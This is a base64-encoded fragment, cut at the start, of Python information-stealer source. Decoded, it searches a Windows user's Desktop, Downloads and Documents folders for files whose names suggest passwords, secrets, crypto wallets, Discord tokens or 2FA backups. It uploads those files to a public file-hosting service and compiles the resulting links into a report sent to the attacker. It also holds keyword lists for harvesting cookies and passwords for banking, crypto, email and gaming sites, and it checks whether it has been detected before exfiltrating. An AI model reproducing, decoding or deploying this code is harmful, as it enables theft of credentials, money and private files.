uc2Zlci5zaC8iLCBmaWxlcz1maWxlcykKICAgICMgICAgICAgICB1cmwgPSB1cGxvYWQudGV4dAogICAgIyAgICAgICAgIHJldHVybiB1cmwKICAgICMgICAgIGV4Y2VwdDoKICAgICMgICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBkZWYgS2l3aUZvbGRlcihwYXRoRiwga2V5d29yZHMpOgogICAgICAgIGdsb2JhbCBLaXdpRmlsZXMKICAgICAgICBtYXhmaWxlc3BlcmRpciA9IDcKICAgICAgICBpID0gMAogICAgICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQogICAgICAgIGZmb3VuZCA9IFtdCiAgICAgICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybgogICAgICAgICAgICBpICs9IDEKICAgICAgICAgICAgaWYgaSA8PSBtYXhmaWxlc3BlcmRpcjoKICAgICAgICAgICAgICAgIHVybCA9IHVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkKICAgICAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQoKICAgIEtpd2lGaWxlcyA9IFtdCiAgICBkZWYgS2l3aUZpbGUocGF0aCwga2V5d29yZHMpOgogICAgICAgIGdsb2JhbCBLaXdpRmlsZXMKICAgICAgICBmaWZvdW5kID0gW10KICAgICAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQogICAgICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgICAgIGZvciB3b3JmIGluIGtleXdvcmRzOgogICAgICAgICAgICAgICAgaWYgd29yZiBpbiBmaWxlLmxvd2VyKCk6CiAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUocGF0aCArICIvIiArIGZpbGUpIGFuZCAiLnR4dCIgaW4gZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgZmlmb3VuZC5hcHBlbmQoW3BhdGggKyAiLyIgKyBmaWxlLCB1cGxvYWRUb0Fub25maWxlcyhwYXRoICsgIi8iICsgZmlsZSldKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIocGF0aCArICIvIiArIGZpbGUpOgogICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSBwYXRoICsgIi8iICsgZmlsZQogICAgICAgICAgICAgICAgICAgICAgICBLaXdpRm9sZGVyKHRhcmdldCwga2V5d29yZHMpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCgogICAgICAgIEtpd2lGaWxlcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoLCBmaWZvdW5kXSkKCiAgICBkZWYgS2l3aSgpOgogICAgICAgIHVzZXIgPSB0ZW1wLnNwbGl0KCJcQXBwRGF0YSIpWzBdCiAgICAgICAgcGF0aDJzZWFyY2ggPSBbCiAgICAgICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLAogICAgICAgICAgICB1c2VyICsgIi9Eb3dubG9hZHMiLAogICAgICAgICAgICB1c2VyICsgIi9Eb2N1bWVudHMiCiAgICAgICAgXQoKICAgICAgICBrZXlfd29yZHNGb2xkZXIgPSBbCiAgICAgICAgICAgICJhY2NvdW50IiwKICAgICAgICAgICAgImFjb3VudCIsCiAgICAgICAgICAgICJwYXNzdyIsCiAgICAgICAgICAgICJzZWNyZXQiLAogICAgICAgICAgICAic2VuaGFzIiwKICAgICAgICAgICAgImNvbnRhcyIsCiAgICAgICAgICAgICJiYWNrdXAiLAogICAgICAgICAgICAiMmZhIiwKICAgICAgICAgICAgImltcG9ydGFudGUiLAogICAgICAgICAgICAicHJpdmFkbyIsCiAgICAgICAgICAgICJleG9kdXMiLAogICAgICAgICAgICAiZXhwb3NlZCIsCiAgICAgICAgICAgICJwZXJkZXIiLAogICAgICAgICAgICAiYW1pZ29zIiwKICAgICAgICAgICAgImVtcHJlc2EiLAogICAgICAgICAgICAidHJhYmFsaG8iLAogICAgICAgICAgICAid29yayIsCiAgICAgICAgICAgICJwcml2YXRlIiwKICAgICAgICAgICAgInNvdXJjZSIsCiAgICAgICAgICAgICJ1c2VycyIsCiAgICAgICAgICAgICJ1c2VybmFtZSIsCiAgICAgICAgICAgICJsb2dpbiIsCiAgICAgICAgICAgICJ1c2VyIiwKICAgICAgICAgICAgInVzdWFyaW8iLAogICAgICAgICAgICAibG9nIgogICAgICAgIF0KCiAgICAgICAga2V5X3dvcmRzRmlsZXMgPSBbCiAgICAgICAgICAgICJwYXNzdyIsCiAgICAgICAgICAgICJtZHAiLAogICAgICAgICAgICAibW90ZGVwYXNzZSIsCiAgICAgICAgICAgICJtb3RfZGVfcGFzc2UiLAogICAgICAgICAgICAibG9naW4iLAogICAgICAgICAgICAic2VjcmV0IiwKICAgICAgICAgICAgImFjY291bnQiLAogICAgICAgICAgICAiYWNvdW50IiwKICAgICAgICAgICAgInBheXBhbCIsCiAgICAgICAgICAgICJiYW5xdWUiLAogICAgICAgICAgICAiYWNjb3VudCIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAibWV0YW1hc2siLAogICAgICAgICAgICAid2FsbGV0IiwKICAgICAgICAgICAgImNyeXB0byIsCiAgICAgICAgICAgICJleG9kdXMiLAogICAgICAgICAgICAiZGlzY29yZCIsCiAgICAgICAgICAgICIyZmEiLAogICAgICAgICAgICAiY29kZSIsCiAgICAgICAgICAgICJtZW1vIiwKICAgICAgICAgICAgImNvbXB0ZSIsCiAgICAgICAgICAgICJ0b2tlbiIsCiAgICAgICAgICAgICJiYWNrdXAiLAogICAgICAgICAgICAic2VjcmV0IiwKICAgICAgICAgICAgIm1vbSIsCiAgICAgICAgICAgICJmYW1pbHkiCiAgICAgICAgICAgIF0KCiAgICAgICAgd2lraXRoID0gW10KICAgICAgICBmb3IgcGF0dCBpbiBwYXRoMnNlYXJjaDogCiAgICAgICAgICAgIGtpd2kgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1LaXdpRmlsZSwgYXJncz1bcGF0dCwga2V5X3dvcmRzRmlsZXNdKTtraXdpLnN0YXJ0KCkKICAgICAgICAgICAgd2lraXRoLmFwcGVuZChraXdpKQogICAgICAgIHJldHVybiB3aWtpdGgKCgogICAgZ2xvYmFsIGtleXdvcmQsIGNvb2tpV29yZHMsIHBhc3dXb3JkcywgQ29va2lDb3VudCwgUDRzc3dDb3VudCwgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcAoKICAgIGtleXdvcmQgPSBbCiAgICAgICAgJ21haWwnLCAnW2NvaW5iYXNlXShodHRwczovL2NvaW5iYXNlLmNvbSknLCAnW3NlbGxpeF0oaHR0cHM6Ly9zZWxsaXguaW8pJywgJ1tnbWFpbF0oaHR0cHM6Ly9nbWFpbC5jb20pJywgJ1tzdGVhbV0oaHR0cHM6Ly9zdGVhbS5jb20pJywgJ1tkaXNjb3JkXShodHRwczovL2Rpc2NvcmQuY29tKScsICdbcmlvdGdhbWVzXShodHRwczovL3Jpb3RnYW1lcy5jb20pJywgJ1t5b3V0dWJlXShodHRwczovL3lvdXR1YmUuY29tKScsICdbaW5zdGFncmFtXShodHRwczovL2luc3RhZ3JhbS5jb20pJywgJ1t0aWt0b2tdKGh0dHBzOi8vdGlrdG9rLmNvbSknLCAnW3R3aXR0ZXJdKGh0dHBzOi8vdHdpdHRlci5jb20pJywgJ1tmYWNlYm9va10oaHR0cHM6Ly9mYWNlYm9vay5jb20pJywgJ2NhcmQnLCAnW2VwaWNnYW1lc10oaHR0cHM6Ly9lcGljZ2FtZXMuY29tKScsICdbc3BvdGlmeV0oaHR0cHM6Ly9zcG90aWZ5LmNvbSknLCAnW3lhaG9vXShodHRwczovL3lhaG9vLmNvbSknLCAnW3JvYmxveF0oaHR0cHM6Ly9yb2Jsb3guY29tKScsICdbdHdpdGNoXShodHRwczovL3R3aXRjaC5jb20pJywgJ1ttaW5lY3JhZnRdKGh0dHBzOi8vbWluZWNyYWZ0Lm5ldCknLCAnYmFuaycsICdbcGF5cGFsXShodHRwczovL3BheXBhbC5jb20pJywgJ1tvcmlnaW5dKGh0dHBzOi8vb3JpZ2luLmNvbSknLCAnW2FtYXpvbl0oaHR0cHM6Ly9hbWF6b24uY29tKScsICdbZWJheV0oaHR0cHM6Ly9lYmF5LmNvbSknLCAnW2FsaWV4cHJlc3NdKGh0dHBzOi8vYWxpZXhwcmVzcy5jb20pJywgJ1twbGF5c3RhdGlvbl0oaHR0cHM6Ly9wbGF5c3RhdGlvbi5jb20pJywgJ1toYm9dKGh0dHBzOi8vaGJvLmNvbSknLCAnW3hib3hdKGh0dHBzOi8veGJveC5jb20pJywgJ2J1eScsICdzZWxsJywgJ1tiaW5hbmNlXShodHRwczovL2JpbmFuY2UuY29tKScsICdbaG90bWFpbF0oaHR0cHM6Ly9ob3RtYWlsLmNvbSknLCAnW291dGxvb2tdKGh0dHBzOi8vb3V0bG9vay5jb20pJywgJ1tjcnVuY2h5cm9sbF0oaHR0cHM6Ly9jcnVuY2h5cm9sbC5jb20pJywgJ1t0ZWxlZ3JhbV0oaHR0cHM6Ly90ZWxlZ3JhbS5jb20pJywgJ1twb3JuaHViXShodHRwczovL3Bvcm5odWIuY29tKScsICdbZGlzbmV5XShodHRwczovL2Rpc25leS5jb20pJywgJ1tleHByZXNzdnBuXShodHRwczovL2V4cHJlc3N2cG4uY29tKScsICdjcnlwdG8nLCAnW3ViZXJdKGh0dHBzOi8vdWJlci5jb20pJywgJ1tuZXRmbGl4XShodHRwczovL25ldGZsaXguY29tKScKICAgIF0KCiAgICBDb29raUNvdW50LCBQNHNzd0NvdW50ID0gMCwgMAogICAgY29va2lXb3JkcyA9IFtdCiAgICBwYXN3V29yZHMgPSBbXQoKICAgIFdhbGxldHNaaXAgPSBbXSAjIFtOYW1lLCBMaW5rXQogICAgR2FtaW5nWmlwID0gW10KICAgIE90aGVyWmlwID0gW10KCiAgICBHYXRoZXJBbGwoKQogICAgREVURUNURUQgPSBUUjZzdChDMDBrMTMpCiAgICAjIERFVEVDVEVEID0gRmFsc2UKICAgIGlmIG5vdCBERVRFQ1RFRDoKICAgICAgICB3aWtpdGggPSBLaXdpKCkKCiAgICAgICAgZm9yIHRocmVhZCBpbiB3aWtpdGg6IHRocmVhZC5qb2luKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMikKCiAgICAgICAgZmlsZXRleHQgPSAiXG4iCiAgICAgICAgZm9yIGFyZyBpbiBLaXdpRmlsZXM6CiAgICAgICAgICAgIGlmIGxlbihhcmdbMl0pICE9IDA6CiAgICAgICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXQogICAgICAgICAgICAgICAgZm9sZGxpc3QgPSBhcmdbMl0gICAgICAgCiAgICAgICAgICAgICAgICBmaWxldGV4dCArPSBmIvCfk4Ege2ZvbGRwYXRofVxuIgoKICAgICAgICAgICAgICAgIGZvciBmZmlsIGluIGZvbGRsaXN0OgogICAgICAgICAgICAgICAgICAgIGEgPSBmZmlsWzBdLnNwbGl0KCIvIikKICAgICAgICAgICAgICAgICAgICBmaWxlYW5tZSA9IGFbbGVuKGEpLTFdCiAgICAgICAgICAgICAgICAgICAgYiA9IGZmaWxbMV0KICAgICAgICAgICAgICAgICAgICBmaWxldGV4dCArPSBmIuKUlOKUgDpvcGVuX2ZpbGVfZm9sZGVyOiBbe2ZpbGVhbm1lfV0oe2J9KVxuIgogICAgICAgICAgICAgICAgZmlsZXRleHQgKz0gIlxuIgogICAgICAgIHVwbG9hZCgia2l3aSIsIGZpbGV0ZXh0KQoKY29sb3IoKQ==
